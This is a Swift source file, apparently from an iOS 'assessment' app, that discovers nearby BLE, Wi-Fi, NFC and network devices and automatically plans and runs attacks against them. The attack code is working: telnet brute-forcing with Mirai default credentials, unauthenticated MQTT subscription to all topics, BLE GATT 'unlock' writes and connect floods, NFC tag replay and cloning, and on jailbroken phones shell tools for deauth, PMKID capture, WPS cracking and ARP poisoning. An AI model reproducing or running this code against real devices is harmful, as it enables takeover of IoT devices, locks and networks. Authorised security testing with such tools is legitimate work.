import Foundation
import Network
import SwiftUI

struct PlanEntry: Identifiable {
    var id = UUID()
    var vector: AttackVector
    var target: TargetDevice?
}

@MainActor
final class Orchestrator: ObservableObject {
    @Published var phase: Phase = .idle
    @Published var targets: [TargetDevice] = []
    @Published var findings: [Finding] = []
    @Published var logs: [LogEntry] = []
    @Published var plan: [PlanEntry] = []
    @Published var progress: Double = 0
    @Published var currentStep: String = ""
    @Published var report: Report?
    @Published var reportURL: URL?
    @Published var radarPing: Int = 0
    @Published var attackLog: [AttackRecord] = []
    @Published var nfcDumps: [NFCDump] = []

    let ble = BLEScanner()
    let wifi = WiFiScanner()
    let nfc = NFCScanner()
    let net = NetScanner()
    let shell = ShellRunner.shared

    init() {
        loadDumps()
    }

    private let journalPath: URL = {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("audit_journal.txt")
    }()

    func log(_ text: String, _ level: LogEntry.Level = .info) {
        let line = "[\(timeNow())] [\(level.rawValue.uppercased())] \(text)"
        logs.append(LogEntry(level: level, text: text))
        if let fh = try? FileHandle(forWritingTo: journalPath) {
            _ = try? fh.seekToEnd()
            try? fh.write(contentsOf: Data((line + "\n").utf8))
            try? fh.close()
        } else {
            try? (line + "\n").write(to: journalPath, atomically: true, encoding: .utf8)
        }
    }

    private func timeNow() -> String {
        let f = DateFormatter(); f.dateFormat = "HH:mm:ss"
        return f.string(from: Date())
    }

    private func addTarget(_ t: TargetDevice) {
        guard !targets.contains(where: { $0.proto == t.proto && ($0.mac ?? $0.name) == (t.mac ?? t.name) }) else { return }
        var t = t
        let raw = t.name
        t.name = TargetNamer.pretty(t, rawName: raw)
        t.extra["rawName"] = raw
        targets.append(t)
        radarPing += 1
        log("target discovered: \(t.name) [\(t.proto.rawValue)] rssi=\(t.rssi)", .good)
    }

    // MARK: - FSM

    func startScan() {
        guard phase == .idle || phase == .report else { return }
        phase = .scan
        targets = []; plan = []; findings = []; report = nil; progress = 0
        log("=== session start — journal rehydrated ===", .exec)
        log("jailbreak: \(shell.isJailbroken ? "detected" : "NOT detected") — tools: \(shell.availableTools.joined(separator: ", ").isEmpty ? "none" : shell.availableTools.joined(separator: ", "))", .exec)

        Task {
            await self.runScanPipeline()
        }
    }

    private func runScanPipeline() async {
        // NFC in parallelo (attende tap)
        let nfcTask = Task { [weak self] () -> NFCDump? in
            guard let self else { return nil }
            return await self.nfc.fullScan(timeout: 18)
        }

        // BLE
        phase = .scan
        log("BLE sweep…", .exec)
        await withCheckedContinuation { c in
            ble.startScan(timeout: 8) { [weak self] t in
                MainActor.assumeIsolated { self?.addTarget(t) }
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 8) { c.resume() }
        }

        // WiFi (private framework probe → fallback)
        if phase == .scan {
            log("Wi-Fi metadata probe (MobileWiFi)…", .exec)
            let nets = await Task.detached { [wifi] in wifi.availableNetworks() }.value
            if nets.isEmpty {
                log("Wi-Fi: no networks readable (fw probe fallita) — vettori Wi-Fi restano PLAN", .warn)
            } else {
                for n in nets {
                    var t = TargetDevice(name: n.ssid, proto: .wifi, rssi: n.rssi, mac: n.bssid, via: "Wi-Fi")
                    t.extra["sec"] = n.sec
                    addTarget(t)
                }
            }
        }

        // mDNS
        log("mDNS/Bonjour sweep (_hap, _googlecast, _esphomelib, _ipp)…", .exec)
        await withCheckedContinuation { c in
            net.bonjour { [weak self] t in
                DispatchQueue.main.async {
                    Task { @MainActor [weak self] in self?.addTarget(t) }
                }
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 6) { c.resume() }
        }
        net.stopBonjour()

        // SSDP
        log("SSDP M-SEARCH (ssdp:all)…", .exec)
        await withCheckedContinuation { c in
            net.ssdp(timeout: 6) { [weak self] t in
                DispatchQueue.main.async {
                    Task { @MainActor [weak self] in self?.addTarget(t) }
                }
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 7) { c.resume() }
        }

        // NFC risultato
        if let dump = await nfcTask.value {
            var t = TargetDevice(name: dump.title, proto: .nfc, rssi: 0, via: "NFC field")
            t.extra["uid"] = dump.uid
            t.extra["family"] = dump.family
            addTarget(t)
            saveDump(dump)
            log("NFC dump: \(dump.title) — \(dump.pages.count) pages, \(dump.ndefHex.count) NDEF", .good)
        } else {
            log("NFC: nessun tag letto in sessione", .info)
        }

        // ENUMERATE: port probe su host noti
        phase = .enumerate
        log("TCP enumeration su host scoperti (23,80,161,502,554,1883,5683,8080,9100)…", .exec)
        var enumerated: [TargetDevice] = []
        for t in targets.filter({ $0.proto == .net && isNumericHost($0.extra["host"]) }) {
            let host = t.extra["host"]!
            let found = await collectPorts(host: host)
            var t2 = t
            t2.extra["open"] = found.ports.joined(separator: ",")
            t2.extra["banners"] = found.banners
            enumerated.append(t2)
            log("\(host): open [\(found.ports.joined(separator: ","))]", found.ports.isEmpty ? .warn : .good)
        }
        for e in enumerated { if let idx = targets.firstIndex(where: { $0.id == e.id }) { targets[idx] = e } }

        // MATCH
        phase = .match
        buildPlan()
        log("plan armed: \(plan.count) vector(s) — conferma per eseguire", .good)
        phase = .armed
        progress = 1.0
    }

    private func isNumericHost(_ h: String?) -> Bool {
        guard let h, !h.isEmpty else { return false }
        return h.range(of: "^[0-9.]+$") != nil || h.contains(":")
    }

    private func collectPorts(host: String) async -> (ports: [String], banners: String) {
        var ports: [String] = []
        var banners: [String] = []
        await withCheckedContinuation { (c: CheckedContinuation<Void, Never>) in
            NetScanner.portProbe(host: host, ports: [23, 80, 161, 502, 554, 1883, 5683, 8080, 9100],
                                 timeout: 2) { port, banner in
                ports.append(String(port))
                if !banner.isEmpty { banners.append("\(port): \(banner.prefix(120))") }
            } onDone: { c.resume() }
        }
        return (ports, banners.joined(separator: " | "))
    }

    // MARK: - Matching

    private func vec(_ id: String) -> AttackVector? { VectorDB.all().first { $0.id == id } }

    private func buildPlan() {
        var entries: [PlanEntry] = []
        let tools = Set(shell.availableTools)

        for t in targets {
            switch t.proto {
            case .ble:
                if let v = vec("ble_enum") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("ble_write") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("ble_sweyntooth") { entries.append(PlanEntry(vector: v, target: t)) }
                for id in ["ble_blueborne", "ble_bias", "ble_knob"] {
                    if let v = vec(id) { entries.append(PlanEntry(vector: v, target: t)) }
                }
            case .wifi:
                for id in ["wifi_deauth", "wifi_pmkid", "wifi_eviltwin", "wifi_wps_pixie"] {
                    if let v = vec(id) { entries.append(PlanEntry(vector: v, target: t)) }
                }
            case .net:
                let open = (t.extra["open"] ?? "").split(separator: ",", omittingEmptySubsequences: true).compactMap { UInt16(String($0)) }
                let map: [UInt16: String] = [23: "net_telnet", 161: "net_snmp", 502: "net_modbus",
                                             554: "net_rtsp", 1883: "net_mqtt", 5683: "net_coap",
                                             80: "net_upnp", 8080: "net_upnp"]
                for p in open {
                    if let id = map[p], let v = vec(id), v.cap == Capability.native {
                        entries.append(PlanEntry(vector: v, target: t))
                    }
                }
                if open.contains(80) || open.contains(8080) {
                    if let v = vec("net_hnap") { entries.append(PlanEntry(vector: v, target: t)) }
                }
            case .nfc:
                if let v = vec("nfc_mifare1k") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("nfc_clone") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("nfc_ndef_inject") { entries.append(PlanEntry(vector: v, target: t)) }
            default: break
            }
        }

        // shell tool globali disponibili
        let shellMap: [String: String] = ["nmap": "net_telnet", "tcpdump": "wifi_handshake",
                                          "reaver": "wifi_wps_pin", "pixiewps": "wifi_wps_pixie",
                                          "hcxdumptool": "wifi_pmkid", "mdk3": "wifi_beaconflood",
                                          "yersinia": "wifi_dhcp_starve", "ettercap": "wifi_arppois",
                                          "zbdsniff": "zb_rejoin", "curl": "net_hnap"]
        for tool in shell.availableTools where tools.contains(tool) {
            if let id = shellMap[tool], let v = vec(id), !entries.contains(where: { $0.vector.id == id }) {
                entries.append(PlanEntry(vector: v, target: nil))
            }
        }
        plan = entries
    }

    // MARK: - Execute

    func execute() {
        guard phase == .armed, !plan.isEmpty else { return }
        phase = .execute
        Haptics.heavy()
        findings = []
        log("=== execution start — \(plan.count) step(s) ===", .exec)
        Task { await runExecution() }
    }

    private func runExecution() async {
        let total = plan.count
        for (i, entry) in plan.enumerated() {
            currentStep = entry.vector.name
            log("→ \(entry.vector.name) (\(entry.vector.ref))", .exec)
            let evidence = await runVector(entry)
            let f = Finding(vectorID: entry.vector.id,
                            title: entry.vector.name,
                            target: entry.target.map { "\($0.name)" } ?? "global",
                            sev: entry.vector.sev,
                            cvss: entry.vector.cvss,
                            cvssVec: entry.vector.cvssVec,
                            attack: entry.vector.attack,
                            evidence: String(evidence.prefix(1500)),
                            repro: [entry.vector.prereq, entry.vector.hint],
                            impact: entry.vector.brief,
                            remediation: entry.vector.remediation)
            findings.append(f)
            attackLog.append(AttackRecord(vectorID: entry.vector.id, vector: entry.vector.name,
                                          target: f.target, outcome: outcomeLabel(entry, evidence),
                                          evidence: String(evidence.prefix(200))))
            journal("finding[\(f.sev.rawValue)] \(f.title) @ \(f.target) — \(String(evidence.prefix(120)))")
            progress = Double(i + 1) / Double(total)
        }
        currentStep = ""
        let rep = Report(title: "RedHat Sec — Assessment \(DateFormatter.localizedString(from: Date(), dateStyle: .short, timeStyle: .short))",
                         date: Date(), targets: targets, findings: findings)
        report = rep
        reportURL = ReportBuilder.write(rep)
        phase = .report
        Haptics.win()
        log("report generato: \(findings.count) finding(s)", .good)
    }

    func executeOnly(_ entry: PlanEntry) {
        phase = .armed
        plan = [entry]
        findings = []
        execute()
    }

    private func outcomeLabel(_ e: PlanEntry, _ evidence: String) -> String {
        switch e.vector.cap {
        case .shellTool(let t):
            return evidence.hasPrefix("PLAN") ? "tool missing" : "tool:\(t)"
        case .plan:
            return "plan"
        case .native:
            return evidence.hasPrefix("handler") || evidence.hasPrefix("no ") ? "failed" : "executed"
        }
    }

    // MARK: - NFC dumps

    private var dumpsDir: URL {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("nfc_dumps", isDirectory: true)
    }

    func saveDump(_ d: NFCDump) {
        try? FileManager.default.createDirectory(at: dumpsDir, withIntermediateDirectories: true)
        let f = dumpsDir.appendingPathComponent("\(d.uid.replacingOccurrences(of: ":", with: "")).json")
        if let data = try? JSONEncoder().encode(d) { try? data.write(to: f) }
        nfcDumps.append(d)
    }

    func deleteDump(_ d: NFCDump) {
        let f = dumpsDir.appendingPathComponent("\(d.uid.replacingOccurrences(of: ":", with: "")).json")
        try? FileManager.default.removeItem(at: f)
        nfcDumps.removeAll { $0.id == d.id }
    }

    func loadDumps() {
        guard let files = try? FileManager.default.contentsOfDirectory(at: dumpsDir, includingPropertiesForKeys: nil) else { return }
        nfcDumps = files.compactMap { try? JSONDecoder().decode(NFCDump.self, from: try! Data(contentsOf: $0)) }
    }

    func replayDump(_ d: NFCDump) {
        log("NFC replay started — avvicina il tag target", .exec)
        Task {
            let lines = await nfc.replay(d)
            for l in lines { log(l, l.contains("✓") ? .good : .warn) }
        }
    }

    private func journal(_ line: String) {        let l = "[\(timeNow())] \(line)"
        if let fh = try? FileHandle(forWritingTo: journalPath) {
            _ = try? fh.seekToEnd()
            try? fh.write(contentsOf: Data((l + "\n").utf8))
            try? fh.close()
        }
    }

    private func runVector(_ e: PlanEntry) async -> String {
        switch e.vector.cap {
        case .shellTool(let tool):
            guard shell.resolve(tool) != nil else {
                return "PLAN (tool '\(tool)' non installato sul device) — prereq: \(e.vector.prereq)"
            }
            let args = templateArgs(e.vector.hint, target: e.target)
            let sh = ShellRunner.shared
            let r = await Task.detached { sh.run(tool, args: args, timeout: 30) }.value
            return "tool \(tool) exit=\(r.exitCode)\nstdout: \(r.stdout.prefix(1000))\nstderr: \(r.stderr.prefix(400))"
        case .plan:
            return "PLAN — richiede hardware/radio esterna.\nPrereq: \(e.vector.prereq)\nExec: \(e.vector.hint)"
        case .native:
            return await runNative(e)
        }
    }

    private func templateArgs(_ hint: String, target: TargetDevice?) -> [String] {
        let bssid = target?.mac ?? "00:11:22:33:44:55"
        let host = target?.extra["host"] ?? "192.168.1.1"
        let iface = "wlan0"
        let h = hint
            .replacingOccurrences(of: "<BSSID>", with: bssid)
            .replacingOccurrences(of: "<HOST>", with: host)
            .replacingOccurrences(of: "<IFACE>", with: iface)
            .replacingOccurrences(of: "<CH>", with: "6")
            .replacingOccurrences(of: "<CLIENT>", with: "ff:ff:ff:ff:ff:ff")
        return h.split(separator: " ").map(String.init)
    }

    private func runNative(_ e: PlanEntry) async -> String {
        let id = e.vector.id
        switch id {
        case "ble_enum":
            guard let t = e.target else { return "no target" }
            let rep = await ble.enumerate(t)
            if let w = rep.writable.first, let idx = targets.firstIndex(where: { $0.id == t.id }) {
                targets[idx].extra["svcUUID"] = w.svc
                targets[idx].extra["chrUUID"] = w.chr
                if (targets[idx].extra["payload"] ?? "").isEmpty { targets[idx].extra["payload"] = "0100" }
                targets[idx].extra["autoArm"] = "1"
                log("auto-arm \(t.name): svc=\(w.svc) chr=\(w.chr) payload=0100", .good)
            }
            return rep.lines.isEmpty ? "connect ok, nessun servizio esposto" : rep.lines.joined(separator: "\n")
        case "ble_write":
            guard let t = e.target else { return "no target" }
            guard let hex = t.extra["payload"], !hex.isEmpty else {
                return "WRITE ARMED ma payload non configurato — imposta payload hex dal target detail (es. 0100 per unlock). Esecuzione skip."
            }
            guard let svc = t.extra["svcUUID"], let chr = t.extra["chrUUID"],
                  let data = Data(hexString: hex) else {
                return "payload/svc/chr mancanti — configura nel target detail"
            }
            let r = await ble.write(t, service: svc, characteristic: chr, payload: data)
            return "GATT write → \(r)"
        case "ble_connectflood":
            guard let t = e.target else { return "no target" }
            let n = await ble.flood(t, attempts: 12)
            return "flood: \(n) connect cycle completi — target responsivo = \(n < 6 ? "possibile DoS parziale" : "non impattato")"
        case "net_mqtt":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            return await netMQTT(host)
        case "net_coap":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            let req = coapGetWellKnown()
            let r = await udpRoundTrip(host: host, port: 5683, payload: req, timeout: 3)
            return r.isEmpty ? "nessuna risposta CoAP — porta chiusa o DTLS richiesto" : "CoAP reply: \(r.prefix(600))"
        case "net_snmp":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            let r = await udpRoundTrip(host: host, port: 161, payload: snmpGetSysDescr(), timeout: 3)
            return r.isEmpty ? "nessuna risposta SNMP (community default non accettata o UDP filtrato)"
                             : "SNMP sysDescr: \(r.prefix(400))"
        case "net_modbus":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            let r = await tcpRoundTrip(host: host, port: 502, payload: modbusReadHolding(), timeout: 3)
            return r.isEmpty ? "nessuna risposta Modbus/TCP" : "Modbus reply (hex): \(r.prefix(200))"
        case "net_rtsp":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            let req = "OPTIONS rtsp://\(host):554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            let r = await tcpRoundTrip(host: host, port: 554, payload: req.data(using: .ascii) ?? Data(), timeout: 3)
            return r.isEmpty ? "RTSP muto — porta chiusa" : r.prefix(500).description
        case "net_telnet":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            return await netTelnet(host)
        case "net_upnp":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            return await netUPnP(host)
        default:
            return "handler nativo non implementato per \(id) — trattato come PLAN"
        }
    }

    // MARK: - Net payload builders

    private func vbi(_ n: Int) -> Data {
        var b: [UInt8] = []; var v = n
        repeat { var d = UInt8(v % 128); v /= 128; if v > 0 { d |= 0x80 }; b.append(d) } while v > 0
        return Data(b)
    }

    private func mqttConnectPacket() -> Data {
        var pl = Data([0x00, 0x04]) + "MQTT".data(using: .ascii)!
        pl += Data([0x04, 0x02, 0x00, 0x3C, 0x00, 0x05]) + "rhs-a".data(using: .ascii)!
        return Data([0x10]) + vbi(pl.count) + pl
    }

    private func mqttSubscribePacket() -> Data {
        var sp = Data([0x00, 0x01])
        sp += Data([0x00, 0x01]) + Data("#".utf8) + Data([0x01])
        return Data([0x82]) + vbi(sp.count) + sp
    }

    private func netMQTT(_ host: String) async -> String {
        let connect = mqttConnectPacket()
        let ack = await tcpRoundTrip(host: host, port: 1883, payload: connect, timeout: 4, maxRecv: 1)
        guard let first = ack.utf8.first, first == 0x20 else {
            return "CONNECT inviato — CONNACK non ricevuto (\(ack.isEmpty ? "muto" : "hex \(ack.prefix(60))")) — broker chiude o auth richiesta"
        }
        let sub = mqttSubscribePacket()
        let msgs = await tcpRoundTrip(host: host, port: 1883, payload: sub, timeout: 6, maxRecv: 6)
        return "CONNACK OK — broker APERTO (no auth). SUBSCRIBE # → traffico: \(msgs.prefix(800).isEmpty ? "(silenzio, ma broker scrivibile)" : msgs.prefix(800).description)"
    }

    private func coapGetWellKnown() -> Data {
        var d = Data([0x41, 0x01, 0x00, 0x01])
        d += Data([0xBA]) + Data("well-known".utf8)
        d += Data([0x04]) + Data("core".utf8)
        return d
    }

    private func snmpGetSysDescr() -> Data {
        Data([0x30, 0x29, 0x02, 0x01, 0x00, 0x04, 0x06,
              0x70, 0x75, 0x62, 0x6C, 0x69, 0x63,
              0xA0, 0x1C, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
              0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
              0x30, 0x0E, 0x30, 0x0C, 0x06, 0x08,
              0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00])
    }

    private func modbusReadHolding() -> Data {
        Data([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01])
    }

    private func netTelnet(_ host: String) async -> String {
        let creds: [(String, String)] = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"),
                                         ("root", "root"), ("admin", "1234"), ("root", "1234")]
        for (u, p) in creds {
            let banner = await tcpRoundTrip(host: host, port: 23, payload: Data(), timeout: 2, maxRecv: 1)
            let attempt = "\(u)\n\(p)\n".data(using: .ascii)!
            let r = await tcpRoundTrip(host: host, port: 23, payload: attempt, timeout: 3, maxRecv: 3, delaySend: 0.8)
            if r.contains("#") || r.contains("$") || r.contains("BusyBox") || r.contains("Welcome") {
                return "SUCCESS — telnet \(u):\(p) su \(host). Banner: \(banner.prefix(100))\nShell prompt: \(r.prefix(300))"
            }
        }
        return "telnet table Mirai esaurita su \(host) — nessuna cred di default valida"
    }

    private func netUPnP(_ host: String) async -> String {
        let search = "M-SEARCH * HTTP/1.1\r\nHOST: \(host):1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
        let resp = await udpRoundTrip(host: host, port: 1900, payload: search.data(using: .ascii)!, timeout: 4)
        guard !resp.isEmpty, resp.contains("LOCATION") else { return "UPnP: M-SEARCH unicast senza risposta" }
        let loc = resp.split(separator: "\n").first { $0.uppercased().contains("LOCATION") }?
            .split(separator: ":", maxSplits: 1).last.map { $0.trimmingCharacters(in: .whitespaces) } ?? ""
        guard !loc.isEmpty else { return "UPnP: LOCATION assente\n\(resp.prefix(300))" }
        let lport = UInt16(loc.portPart()) ?? 80
        let path = URL(string: loc)?.path ?? "/"
        let req = "GET \(path) HTTP/1.1\r\nHost: \(host):\(lport)\r\n\r\n"
        let desc = await tcpRoundTrip(host: host, port: lport, payload: req.data(using: .ascii)!, timeout: 4)
        var friendly = "?"
        if let r = desc.range(of: "<friendlyName>(.*?)</friendlyName>", options: .regularExpression) {
            friendly = String(desc[r])
        }
        return "UPnP device: \(friendly.isEmpty ? "?" : friendly)\nLOCATION: \(loc)\n\(desc.prefix(400))"
    }

    private func tcpRoundTrip(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                              maxRecv: Int = 3, delaySend: TimeInterval = 0) async -> String {
        await withCheckedContinuation { c in
            NetIO.tcpSendRecv(host: host, port: port, payload: payload, timeout: timeout,
                              maxRecv: maxRecv, delaySend: delaySend) { c.resume(returning: $0) }
        }
    }

    private func udpRoundTrip(host: String, port: UInt16, payload: Data, timeout: TimeInterval) async -> String {
        await withCheckedContinuation { c in
            NetScanner.udpPoke(host: host, port: port, payload: payload, timeout: timeout) {
                c.resume(returning: $0)
            }
        }
    }
}

enum NetIO {
    static func tcpSendRecv(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                            maxRecv: Int, delaySend: TimeInterval, onResult: @escaping (String) -> Void) {
        guard let p = NWEndpoint.Port(rawValue: port) else { onResult(""); return }
        let c = NWConnection(host: NWEndpoint.Host(host), port: p, using: .tcp)
        var out = Data()
        var done = false
        var recvCount = 0
        let finish: (String) -> Void = {
            guard !done else { return }
            done = true
            c.cancel()
            onResult($0)
        }
        c.stateUpdateHandler = { st in
            switch st {
            case .ready:
                let sendBlock = { c.send(content: payload.isEmpty ? nil : payload,
                                         completion: .contentProcessed { _ in }) }
                if delaySend > 0 {
                    DispatchQueue.global().asyncAfter(deadline: .now() + delaySend, execute: sendBlock)
                } else {
                    sendBlock()
                }
                pump()
            case .failed, .cancelled, .waiting: finish(String(data: out, encoding: .isoLatin1) ?? out.hexPreview)
            default: break
            }
        }
        func pump() {
            guard !done else { return }
            c.receive(minimumIncompleteLength: 1, maximumLength: 8192) { d, _, _, _ in
                if let d = d, !d.isEmpty {
                    out += d
                    recvCount += 1
                    if recvCount < maxRecv { pump(); return }
                }
                finish(String(data: out, encoding: .isoLatin1) ?? out.hexPreview)
            }
        }
        c.start(queue: .global(qos: .utility))
        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { finish(String(data: out, encoding: .isoLatin1) ?? out.hexPreview) }
    }
}
